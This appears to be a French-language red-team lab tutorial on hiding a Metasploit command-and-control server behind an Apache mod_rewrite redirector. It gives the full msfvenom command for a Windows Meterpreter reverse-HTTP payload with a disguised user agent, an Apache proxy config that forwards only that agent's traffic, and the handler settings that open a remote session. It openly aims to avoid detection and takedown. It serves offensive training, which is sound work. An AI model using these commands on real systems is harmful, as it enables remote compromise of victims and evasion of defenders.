### Il y a toujours place à l'amélioration

Comme vous l'avez peut-être deviné, Metasploit lui-même n'est pas un excellent serveur C2 pour les opérations adverses avancées. Ce n'est pas aussi flexible qu'on le souhaiterait; vous ne pouvez pas configurer les agents pour baliser toutes les X secondes avec Y gigue. Un pare-feu de nouvelle génération pourrait rapidement détecter ce trafic C2, car il s'agit d'un flux de trafic constant. De plus, n'importe qui peut se connecter à un écouteur HTTP/HTTPS et découvrir relativement rapidement ce qui se passe.

### Redirecteurs de commande et de contrôle 

Qu'est-ce qu'un redirecteur ?

Avant de plonger dans la configuration d'un redirecteur, qu'est-ce que c'est ? Un redirecteur est exactement ce qu'il paraît. C'est un serveur qui "redirige" les requêtes HTTP /HTTPS en fonction des informations contenues dans le corps de la requête HTTP. Dans les systèmes de production, vous pouvez voir un "redirecteur" sous la forme d'un équilibreur de charge. Ce serveur exécute souvent Apache 2 ou NGINX. Pour cet atelier, nous utiliserons Apache et certains de ses modules pour créer un redirecteur.

En revenant à Metasploit, nous pouvons configurer certaines configurations de base sur Metasploit pour permettre des configurations plus avancées, dans cette tâche ; nous allons mettre en place un redirecteur. Habituellement, cette configuration est configurée sur plusieurs hôtes ; le but est de cacher le véritable serveur de commandement et de contrôle. Le diagramme ci-dessous illustre comment les communications entre une victime et un serveur C2 se produisent.

![c38457eb8f35b56a630d1e1b9f2bc75f](https://github.com/dsgsec/Red-Team/assets/82456829/634c750f-70d8-4c47-b72d-ddc96e66d940)

*Illustration d'un C2 et d'un redirecteur avec des victimes rappelant*

Habituellement, lorsque vous avez un rappel C2 , vous pouvez définir l'hôte de rappel sur un domaine, disons admin.tryhackme.com. Il est très courant que votre serveur C2 soit signalé lorsqu'un utilisateur dépose une plainte. Habituellement, le serveur est démonté assez rapidement. Cela peut parfois être aussi peu que 3 heures et jusqu'à 24 heures . La mise en place d'un redirecteur garantit que toutes les informations que vous avez pu collecter lors de l'engagement sont saines et sauves.\
Mais comment cela empêche-t-il le serveur C2 d'être supprimé ? Certes, si quelqu'un prenait les empreintes digitales de Cobalt Strike sur votre serveur C2, quelqu'un déposerait une plainte et celle-ci serait retirée. C'est vrai, vous devez donc configurer un pare-feu pour autoriser uniquement la communication vers et depuis votre ou vos redirecteurs afin d'atténuer les risques potentiels.

![3ac046c94e8d8be64015641690f5e8a7](https://github.com/dsgsec/Red-Team/assets/82456829/5f13cf12-0b28-4ec8-9639-d47d3928d982)

*Illustration de la manière dont un serveur C2 et un redirecteur doivent interagir*

*\
*

Comment se déroule une configuration de redirecteur ?

Avant de plonger dans la configuration d'un redirecteur, nous devons d'abord comprendre comment il est configuré ; nous allons aligner  cela sur les outils dont nous disposons, qui sont  Metasploit et Apache 2. Dans Apache, nous allons tirer parti d'un module appelé "mod_rewrite" (ou le module Rewrite). Ce module nous permet d'écrire des règles pour transférer les requêtes vers des hôtes internes ou externes sur un serveur en fonction d'en-têtes ou de contenus HTTP spécifiques. Nous aurons besoin d'utiliser plusieurs modules pour configurer notre redirecteur. Les modules suivants doivent être activés :

-   récrire
-   Procuration
-   proxy_http
-   en-têtes

*Remarque : Si vous utilisez l'Attack Box, il existe déjà un service en cours d'exécution sur le port 80 - vous devez modifier le port par défaut sur lequel Apache écoute dans /etc/apache2/ports.conf. Vous devez le faire avant de démarrer le service Apache 2, sinon il ne démarrera pas.*

Vous pouvez installer apache 2 et l'activer avec les commandes suivantes :

Activation des modules et démarrage d'Apache2

```

root@kali$ apt install apache2
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following packages were automatically installed and are no longer required:
  python-bs4 python-chardet python-dicttoxml python-dnspython python-html5lib
  python-jsonrpclib python-lxml python-mechanize python-olefile python-pypdf2
  python-slowaes python-webencodings python-xlsxwriter
Use 'apt autoremove' to remove them.
The following additional packages will be installed:
  apache2-bin apache2-data apache2-utils libaprutil1-dbd-sqlite3
  libaprutil1-ldap
Suggested packages:
  apache2-doc apache2-suexec-pristine | apache2-suexec-custom
The following NEW packages will be installed
  apache2 apache2-bin apache2-data apache2-utils libaprutil1-dbd-sqlite3
  libaprutil1-ldap
0 to upgrade, 6 to newly install, 0 to remove and 416 not to upgrade.

Processing triggers for systemd (237-3ubuntu10.42) ...
Processing triggers for man-db (2.8.3-2ubuntu0.1) ...
Processing triggers for ufw (0.36-0ubuntu0.18.04.1) ...
Processing triggers for ureadahead (0.100.0-21) ...

root@kali$ a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl status apache2
Enabling module rewrite.
To activate the new configuration, you need to run:
  systemctl restart apache2
Enabling module proxy.
To activate the new configuration, you need to run:
  systemctl restart apache2
Enabling module proxy_http.
To activate the new configuration, you need to run:
  systemctl restart apache2
Enabling module headers.
To activate the new configuration, you need to run:
  systemctl restart apache2

● apache2.service - The Apache HTTP Server
     Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: disabled)
     Active: active (running) since Thu 2022-02-10 23:17:08 EST; 7ms ago
       Docs: https://httpd.apache.org/docs/2.4/
    Process: 4149 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
   Main PID: 4153 (apache2)
      Tasks: 1 (limit: 19072)
     Memory: 6.0M
        CPU: 19ms
     CGroup: /system.slice/apache2.service
             └─4153 /usr/sbin/apache2 -k start

```

En utilisant Meterpreter, nous avons la possibilité de configurer divers aspects de la requête HTTP , par exemple, l'agent utilisateur. Il est très courant qu'un acteur de la menace apporte un léger ajustement à l'agent utilisateur dans ses charges utiles HTTP/HTTPS C2. C'est dans chaque requête HTTP, et elles se ressemblent toutes plus ou moins, et il y a de fortes chances qu'un analyste de la sécurité oublie une chaîne d'agent utilisateur modifiée. Pour cette démonstration, nous allons générer une charge utile HTTP Meterpreter Reverse à l'aide de MSFvenom ; puis nous inspecterons la requête HTTP dans Wireshark.

Génération d'une charge utile avec des en-têtes modifiés -

Génération d'une charge utile HTTP modifiée avec Meterpreter

```
root@kali$ msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 454 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe

```

Après avoir généré l'exécutable modifié et l'avoir transféré à une victime, ouvrez Wireshark sur votre hôte et utilisez le `HTTP` filtre pour afficher uniquement les requêtes HTTP . Une fois qu'il a commencé à capturer des paquets, exécutez le binaire sur le système victime. Vous remarquerez qu'une requête HTTP arrive avec notre User-Agent modifié.

![b842ee1430892fa04c092531b9383f4f](https://github.com/dsgsec/Red-Team/assets/82456829/89125bd7-90d2-4b79-89b6-6f8e0fbf4c71)

*Capture de paquets de la charge utile HTTP modifiée avec Meterpreter*

Maintenant que nous avons un champ que nous pouvons contrôler dans la requête HTTP , créons une règle Apache2 mod_rewrite qui filtre sur l'agent utilisateur "NotMeterpreter" et le transmet à notre serveur Metasploit C2.

Modification du fichier de configuration Apache - 

Cette section peut sembler intimidante, mais elle est en fait assez facile ; nous prendrons la configuration Apache par défaut et la modifierons à notre avantage. Sur les systèmes basés sur Debian, la configuration par défaut se trouve dans`/etc/apache2/sites-available/000-default.conf` .

Configuration Apache2 par défaut

```
root@kali$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'
<VirtualHost *:80>

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        <Directory>
                AllowOverride All
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

```

Maintenant que nous avons une idée générale de la structure du fichier de configuration Apache 2, nous devons ajouter quelques lignes au fichier de configuration pour activer le moteur de réécriture, ajouter une condition de réécriture et enfin, passer par le proxy Apache 2. Cela semble assez complexe, mais c'est assez simple.

Pour activer le [moteur de réécriture](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html) , nous devons ajouter  `RewriteEngine On`une nouvelle ligne dans la section VirtualHost.

Nous allons maintenant utiliser une condition de réécriture ciblant l' agent utilisateur HTTP . Pour une liste complète des cibles de requête HTTP, consultez la [documentation mod_rewrite](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html) sur Apache.org. Parce que nous voulons uniquement faire correspondre l'agent utilisateur "NotMeterpreter", nous devons utiliser des expressions régulières de base pour capturer cela ; ajouter un ^ signale le début d'une chaîne et un $ à la fin de la série, nous donnant avec "^NotMeterpreter$". Cette Regex ne capturera que l'agent utilisateur NotMeterpreter. Nous pouvons ajouter cette ligne  `RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"`à notre configuration pour (comme indiqué précédemment) autoriser uniquement les requêtes HTTP avec l'agent utilisateur NotMeterpreter à accéder à Metasploit.

Enfin, nous devons transmettre la demande via Apache2, via notre proxy, à Metasploit. Pour ce faire, nous devons utiliser la fonctionnalité ProxyPass du [module mod_proxy d'Apache ](https://httpd.apache.org/docs/2.4/howto/reverse_proxy.html). Pour ce faire, nous avons juste besoin de spécifier l' URI de base vers lequel la requête sera transmise (dans notre cas, nous avons juste besoin de "/"), et la cible vers laquelle nous voulons transmettre la requête. Cela variera d'une configuration à l'autre, mais cette adresse IP sera votre serveur C2 . Dans le scénario de laboratoire, ce sera localhost et le port sur lesquels Metasploit écoute. Cela nous donnera un fichier de configuration complet qui ressemble à ceci :

Configuration Apache2 modifiée

```
root@kali$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'

<VirtualHost *:80>

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	RewriteEngine On
	RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
	ProxyPass "/" "http://localhost:8080/"

	<Directory>
		AllowOverride All
	</Directory>

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

```

Configurer Exploit/Multi/Gestionnaire

Pour configurer correctement Meterpreter, nous devons apporter quelques modifications ; Nous devons définir notre argument LHOST sur l'interface entrante à partir de laquelle nous attendons des connexions, dans notre laboratoire ; ce sera 127.0.0.1. Dans le monde réel, ce sera votre interface publique à laquelle votre redirecteur se connectera (c'est-à-dire votre adresse IP publique), et le LPORT sera ce que vous voulez. Pour le laboratoire, nous utiliserons TCP/8080 ; cela peut être ce que vous voulez en production. Comme toujours, la meilleure pratique consiste à exécuter les services sur leurs protocoles standard. HTTP doit donc s'exécuter sur le port 80 et HTTPS doit s'exécuter sur le port 443. Ces options devront également être dupliquées pour ReverseListenerBindAddress et ReverseListenerBindPort.

Ensuite, nous devons configurer OverrideLHOST - Cette valeur sera l'adresse IP ou le nom de domaine de votre redirecteur. Après cela, nous devons définir le OverrideLPORT ; ce sera le port sur lequel HTTP *ou  *HTTPS s'exécute, sur votre redirecteur. Enfin, nous devons définir OverrideRequestHost sur true. Cela fera répondre Meterpreter avec les informations OverrideHost, de sorte que toutes les requêtes passent par le redirecteur et non par votre serveur C2 . Maintenant que vous comprenez ce qui doit être configuré, plongeons-y :

Redirecteur Metasploit

```
root@kali$ msfconsole
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > set ReverseListenerBindAddress 127.0.0.1
ReverseListenerBindAddress => 127.0.0.1
msf6 exploit(multi/handler) > set ReverseListenerBindPort 8080
ReverseListenerBindPort => 8080
msf6 exploit(multi/handler) > set OverrideLHOST 192.168.0.44
OverrideLHOST => 192.168.0.44
msf6 exploit(multi/handler) > set OverrideLPORT 80
OverrideLPORT => 80
msf6 exploit(multi/handler) > set HttpUserAgent NotMeterpreter
HttpUserAgent => NotMeterpreter
msf6 exploit(multi/handler) > set OverrideRequestHost true
OverrideRequestHost => true
msf6 exploit(multi/handler) > run
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started HTTP reverse handler on http://127.0.0.1:8080
[*] http://127.0.0.1:8080 handling request from 127.0.0.1; (UUID: zfhp2nwt) Staging x86 payload (176220 bytes) ...
[*] Meterpreter session 3 opened (127.0.0.1:8080 -> 127.0.0.1 ) at 2022-02-11 02:09:24 -0500

```

Une fois que tout cela a été configuré, l'exécution de votre Meterpreter Reverse Shell devrait maintenant passer par proxy toutes les communications via votre redirecteur ! Pour plus de clarté, le schéma ci-dessous montre comment notre redirecteur est configuré dans notre laboratoire ; pour rappel, dans les engagements, vous voudrez utiliser plusieurs hôtes et enregistrements DNS au lieu d'adresses IP. 



*Configuration du redirecteur de laboratoire*
